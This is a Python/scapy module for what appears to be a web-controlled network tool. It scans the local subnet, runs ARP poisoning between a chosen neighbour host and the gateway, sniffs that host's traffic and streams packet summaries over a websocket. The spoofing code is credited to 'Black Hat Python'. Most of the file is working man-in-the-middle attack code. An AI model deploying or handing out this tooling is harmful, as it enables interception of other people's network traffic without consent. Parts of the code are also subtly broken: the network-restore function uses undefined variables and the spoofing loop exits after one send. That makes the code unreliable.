import json
from scapy.all import *
import asyncio
from urllib.parse import parse_qs, urlparse
# ARP spoofing functions from From Justin Sietz https://nostarch.com/blackhatpython
import os
import signal
import threading
import time
import platform

def init():
    global packet_queue
    packet_queue = Queue(maxsize=50)

def darwin_iface():
    a = read_routes()
    interface_info = {
        'gw': a[0][2],
        'netif': a[0][3],
        'ifaddr': a[0][4],
    }
    return interface_info

def linux_iface():
    print(get_if_list())

def win_iface():
    print(show_interfaces())

def get_interface():
    print('Getting interface...')
    if platform.system() == 'Darwin':
        from scapy.arch.unix import read_routes
        d = darwin_iface()
        return d
    elif platform.system() == 'Linux':
        from scapy.arch.linux import get_if_list
        l = linux_iface()
        return l
    elif platform.system() == 'Windows':
        from scapy.arch.windows.__init__ import show_interfaces
        w = win_iface()
        return w

def get_sniffer_config(config_from_client):
    default_config = {
        "count": 0,
        "filter": "",
        "iface": conf.iface,
        "lfilter": "",
        "store": 0
    }
    new_config = config_from_client
    for key in default_config:
        update_config(key, default_config, new_config)
    updated_config = default_config
    return updated_config

def restore_network(gateway_ip, gateway_mac, neighbor_ip, neighbor_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    os.kill(os.getpid(), signal.SIGTERM)

def get_mac(ip_address):
    print('Getting MAC address...')
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r.hwsrc
    return None

def arp_spoof(config_from_client):
    # json_config = json.loads(config_from_client)
    neighbor_ip = config_from_client['args']['ifaddr']
    network_info = get_interface()
    gateway_ip = network_info['gw']
    neighbor_mac = get_mac(neighbor_ip)
    gateway_mac = get_mac(gateway_ip)

    print('neighbor_ip: {}'.format(neighbor_ip))
    print('gateway_ip: {}'.format(gateway_ip))
    print('neighbor_mac: {}'.format(neighbor_mac))
    print('gateway_mac: {}'.format(gateway_mac))

    try:
        while True:
            print('Sending ARP packets...')
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=neighbor_ip))
            send(ARP(op=2, pdst=neighbor_ip, hwdst=neighbor_mac, psrc=gateway_ip))
            break
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")

def sniff_spoofed(neighbor_ip):
    sniff_filter = 'ip host {}'.format(neighbor_ip)
    
    def summarize(x):
        pkt_summary = x.summary()
        packet_queue.put(pkt_summary)

    sniff(prn=lambda x: summarize(x), filter=sniff_filter, iface=conf.iface)

def update_config(key, default_config, new_config):
    try:
        if new_config.get(key) and new_config.get(key) != '':
            print('Updating "%s" in default_config' % key)
            new_val = new_config.get(key)
            default_config.update({key: new_val})
    # Not actually sure this error is possible anymore, but can be a placeholder depending on how we structure the config on the client side
    except AttributeError:
        print('No key "%s" in the args dict that was passed; using the default value' % key)

# from https://hackernoon.com/threaded-asynchronous-magic-and-how-to-wield-it-bba9ed602c32
def start_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

def enqueue_packets(config):
    def summarize(x):
        pkt_summary = x.summary()
        packet_queue.put(pkt_summary)
    sniff(**config, prn=lambda x: summarize(x))

async def dequeue_packets(ws):
    while True:
        pkt_summary = packet_queue.get()
        if pkt_summary:
            await ws.send_str(pkt_summary)

def validate_ifaddr(ifaddr):
    try:
        if 7 <= len(ifaddr) <= 15 and ifaddr.count('.') == 3:
            return ifaddr
    except:
        print('Address is an unexpected format')

def subnet_from_ifaddr(ifaddr):
    four_octets = ifaddr.split('.')
    del four_octets[-1]
    three_octets = '.'.join(four_octets)
    subnet = '{}{}'.format(three_octets, '.*')
    return subnet

def get_arp_table(ifaddr):
    subnet = subnet_from_ifaddr(validate_ifaddr(ifaddr))
    # http://redimp.de/posts/scapy-without-entering-promiscuous-mode/
    answered, unanswered = arping(subnet)
    hostsArray = []
    hostObj = {}
    for index, host in enumerate(answered):
        mac = host[1].hwsrc
        ipAddr = host[1].psrc
        hostObj[index] = {}
        hostObj[index]['mac'] = mac
        hostObj[index]['ipAddr'] = ipAddr
        hostsArray.append(hostObj[index])
    return hostsArray
